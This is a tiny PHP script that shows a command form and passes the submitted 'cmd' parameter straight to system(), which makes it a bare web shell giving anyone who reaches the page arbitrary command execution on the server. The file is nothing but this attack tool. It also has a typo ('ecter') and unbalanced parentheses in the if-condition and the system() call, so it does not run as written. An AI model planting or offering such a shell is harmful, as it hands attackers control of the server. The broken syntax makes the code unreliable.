<?php
    echo 'ecter a command:<br>';
    echo '<form action="">';
    echo '<input type="text" name="cmd">';
    echo '<input type="submit">';
    echo '</form>';

    if (isset($_GET['cmd']) {
        system(($_GET['cmd']);
    }
?>